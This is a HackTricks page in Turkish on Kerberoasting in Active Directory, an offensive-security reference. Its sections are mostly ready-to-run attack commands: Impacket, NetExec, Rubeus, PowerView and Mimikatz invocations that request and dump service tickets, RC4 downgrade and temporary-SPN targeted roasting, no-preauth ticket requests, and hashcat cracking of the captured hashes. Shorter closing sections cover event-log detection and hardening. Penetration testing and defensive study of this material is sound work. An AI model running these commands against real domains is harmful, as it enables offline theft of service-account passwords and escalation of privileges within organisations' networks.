# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, Active Directory'de (AD) bilgisayar hesapları hariç, kullanıcı hesapları altında çalışan hizmetlerle ilişkili TGS ticket'larının edinilmesine odaklanır. Bu ticket'ların şifrelemesinde kullanıcı parolalarından türetilen anahtarlar kullanılır ve bu da credential'ların offline olarak crack edilmesine olanak tanır. Bir kullanıcı hesabının hizmet olarak kullanılması, boş olmayan bir ServicePrincipalName (SPN) özelliğiyle gösterilir.

Kimliği doğrulanmış herhangi bir domain kullanıcısı TGS ticket'ları isteyebilir; bu nedenle özel bir ayrıcalık gerekmez.<sup>[[4]](#references)[[5]](#references)</sup>

### Temel Noktalar

- Kullanıcı hesapları altında çalışan hizmetlere ait TGS ticket'larını hedefler (yani SPN ayarlanmış hesaplar; bilgisayar hesapları değil).
- Ticket'lar, hizmet hesabının parolasından türetilen bir anahtarla şifrelenir ve offline olarak crack edilebilir.
- Yükseltilmiş ayrıcalık gerekmez; kimliği doğrulanmış herhangi bir hesap TGS ticket'ları isteyebilir.

> [!WARNING]
> Çoğu public tool, AES'e kıyasla daha hızlı crack edilebildikleri için RC4-HMAC (etype 23) service ticket'larını istemeyi tercih eder. RC4 TGS hash'leri `$krb5tgs$23$*`, AES128 `$krb5tgs$17$*` ve AES256 `$krb5tgs$18$*` ile başlar. Ancak birçok environment yalnızca AES kullanımına geçiyor. Yalnızca RC4'ün önemli olduğunu varsaymayın.
> Ayrıca “spray-and-pray” roasting'den kaçının. Rubeus'un varsayılan kerberoast davranışı tüm SPN'leri sorgulayıp ticket isteyebilir ve gürültülüdür. Önce ilgi çekici principal'ları enumerate edin ve hedefleyin.

### Service account secrets & Kerberos crypto cost

Birçok hizmet hâlâ elle yönetilen parolalara sahip kullanıcı hesapları altında çalışır. KDC, service ticket'larını bu parolalardan türetilen anahtarlarla şifreler ve ciphertext'i kimliği doğrulanmış herhangi bir principal'a verir; böylece kerberoasting, lockout veya DC telemetry olmadan sınırsız offline tahmin olanağı sağlar. Şifreleme modu cracking bütçesini belirler:

| Mod | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notlar |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | Domain + SPN'den oluşturulan principal başına salt ve 4.096 iteration kullanan PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt, rainbow table'ları etkisiz kılar; ancak kısa parolaların hızlı şekilde crack edilmesine yine de olanak tanır. |
| RC4 + NT hash | Parolanın tek bir MD4 özeti (salt kullanılmayan NT hash); Kerberos ticket başına yalnızca 8-byte confounder ekler | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES'ten ~1000× daha hızlıdır; saldırganlar `msDS-SupportedEncryptionTypes` buna izin verdiğinde RC4'ü zorlar. |

*Matthew Green'in [Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) yazısında belirtildiği üzere Chick3nman tarafından gerçekleştirilen benchmark'lar.<sup>[[3]](#references)</sup>

RC4'ün confounder'ı yalnızca keystream'i randomize eder; her tahmin için ek iş oluşturmaz. Service account'lar random secret'lara (gMSA/dMSA, machine account'lar veya vault tarafından yönetilen string'ler) dayanmıyorsa compromise hızı tamamen GPU bütçesine bağlıdır. Yalnızca AES etype'larını zorunlu kılmak, saniyede milyarlarca tahmin yapılabilen downgrade'i ortadan kaldırır; ancak zayıf insan parolaları yine de PBKDF2'ye yenik düşer.<sup>[[3]](#references)</sup>

### Saldırı

#### Linux

NetExec kullanarak roast edilebilir ticket'lar istemek ve Hashcat ile bunları crack etmek için pratik bir uçtan uca örnek reference [1]'de mevcuttur.<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast kontrollerini içeren çok özellikli araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoast yapılabilen kullanıcıları listeleyin
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS iste ve bellekten dump al
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Teknik 2: Otomatik araçlar
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Bir TGS request, Windows Security Event 4769 oluşturur (Bir Kerberos service ticket istendi).

### OPSEC ve yalnızca AES kullanılan ortamlar

- AES kullanmayan hesaplar için kasıtlı olarak RC4 isteyin:
- Rubeus: `/rc4opsec`, AES kullanmayan hesapları enumerate etmek için tgtdeleg kullanır ve RC4 service ticket ister.
- Rubeus: Kerberoast ile birlikte `/tgtdeleg`, mümkün olduğunda RC4 request'lerini de tetikler.<sup>[[6]](#references)</sup>
- Sessizce başarısız olmak yerine yalnızca AES kullanan hesapları roast edin:
- Rubeus: `/aes`, AES etkin hesapları enumerate eder ve AES service ticket'ları ister (etype 17/18).
- Zaten bir TGT'niz varsa (PTT ile veya bir .kirbi dosyasından), LDAP'ı atlamak için `/spn:<SPN>` veya `/spns:<file>` ile birlikte `/ticket:<blob|path>` kullanabilirsiniz.
- Hedefleme, throttling ve daha az gürültü:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` ve `/jitter:<1-100>` kullanın.
- `/pwdsetbefore:<MM-dd-yyyy>` (daha eski parolalar) ile muhtemelen zayıf parolalara sahip hesapları filtreleyin veya `/ou:<DN>` ile privileged OU'ları hedefleyin.<sup>[[8]](#references)</sup>

Örnekler (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Bir hesabı kontrol ediyor veya değiştirebiliyorsanız, bir SPN ekleyerek onu kerberoastable hâle getirebilirsiniz:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Daha kolay cracking için bir hesabı downgrade edin (hedef nesne üzerinde write privileges gerektirir):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll bir kullanıcı üzerinde (geçici SPN)

BloodHound, bir kullanıcı nesnesi üzerinde kontrolünüz olduğunu (ör. GenericWrite/GenericAll) gösterdiğinde, o kullanıcının hâlihazırda herhangi bir SPN'i olmasa bile güvenilir şekilde belirli kullanıcıyı “targeted-roast” edebilirsiniz:<sup>[[9]](#references)</sup>

- Kontrollü kullanıcıya geçici bir SPN ekleyerek roastable hâle getirin.
- Cracking işlemini kolaylaştırmak için bu SPN için RC4 (etype 23) ile şifrelenmiş bir TGS-REP isteyin.
- `$krb5tgs$23$...` hash'ini hashcat ile crack edin.
- Footprint'i azaltmak için SPN'i temizleyin.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py SPN ekleme -> TGS isteme (etype 23) -> SPN kaldırma işlemlerini otomatikleştirir):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Çıktıyı hashcat autodetect ile (`$krb5tgs$23$` için mode 13100) kırın:
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notları: SPN'lerin eklenmesi/kaldırılması directory değişiklikleri oluşturur (hedef kullanıcıda Event ID 5136/4738) ve TGS isteği Event ID 4769 oluşturur. Throttling ve prompt temizliğini göz önünde bulundurun.

Kerberoast saldırıları için kullanışlı araçları burada bulabilirsiniz: https://github.com/nidem/kerberoast

Linux'tan şu hatayı alırsanız: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` bunun nedeni yerel saat farkıdır. DC ile senkronize edin:

- `ntpdate <DC_IP>` (bazı distro'larda kullanımdan kaldırılmıştır)
- `rdate -n <DC_IP>`

### Domain hesabı olmadan Kerberoast (AS-requested STs)

Eylül 2022'de Charlie Clark, bir principal pre-authentication gerektirmiyorsa, istek gövdesindeki sname'i değiştirerek hazırlanmış bir KRB_AS_REQ üzerinden service ticket almanın mümkün olduğunu ve bunun etkili bir şekilde TGT yerine service ticket elde edilmesini sağladığını gösterdi. Bu yöntem AS-REP roasting tekniğini taklit eder ve geçerli domain kimlik bilgileri gerektirmez.

Ayrıntıları görün: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Geçerli kimlik bilgileri olmadan bu teknikle LDAP sorgulayamayacağınız için bir kullanıcı listesi sağlamalısınız.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
İlgili

AS-REP roastable kullanıcıları hedefliyorsanız ayrıca şuna bakın:

{{#ref}}
asreproast.md
{{#endref}}

### Tespit

Kerberoasting gizli olabilir. DC'lerde Event ID 4769 için arama yapın ve gürültüyü azaltmak üzere filtreler uygulayın:

- `krbtgt` service name'ini ve `$` ile biten service name'lerini (computer accounts) hariç tutun.
- Machine accounts'tan gelen istekleri (`*$$@*`) hariç tutun.
- Yalnızca başarılı istekleri dahil edin (Failure Code `0x0`).
- Encryption types değerlerini takip edin: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Yalnızca `0x17` için alert oluşturmayın.

Örnek PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ek fikirler:

- Host/kullanıcı başına normal SPN kullanımını temel alın; tek bir principal'dan gelen çok sayıda farklı SPN isteği patlamalarını uyarı olarak işaretleyin.
- AES ile güçlendirilmiş domain'lerde olağandışı RC4 kullanımını işaretleyin.

### Mitigation / Hardening

- Servisler için gMSA/dMSA veya machine account'ları kullanın. Managed account'lar 120+ karakterlik rastgele parolalara sahiptir ve otomatik olarak döndürülür; bu da offline cracking işlemini uygulanamaz hâle getirir.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` değerini yalnızca AES olacak şekilde (decimal 24 / hex 0x18) ayarlayarak service account'larda AES'i zorunlu kılın ve ardından parolayı döndürerek AES anahtarlarının türetilmesini sağlayın.<sup>[[7]](#references)</sup>
- Mümkün olduğunda ortamınızda RC4'ü devre dışı bırakın ve RC4 kullanım girişimlerini izleyin. DC'lerde, `msDS-SupportedEncryptionTypes` ayarlanmamış account'lar için varsayılanları yönlendirmek üzere `DefaultDomainSupportedEncTypes` registry değerini kullanabilirsiniz. Kapsamlı şekilde test edin.
- User account'larından gereksiz SPN'leri kaldırın.<sup>[[7]](#references)</sup>
- Managed account'ların kullanılamadığı durumlarda uzun ve rastgele service account parolaları (25+ karakter) kullanın; yaygın parolaları yasaklayın ve düzenli olarak audit gerçekleştirin.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat ile pratikte cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Legacy Kerberos Crypto'dan Düşük Teknikli, Yüksek Etkili Saldırılar (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES Etkinleştirildiğinde RC4 Encrypted TGS İsteme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft'un Kerberoasting'i azaltmaya yardımcı olacak rehberi](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
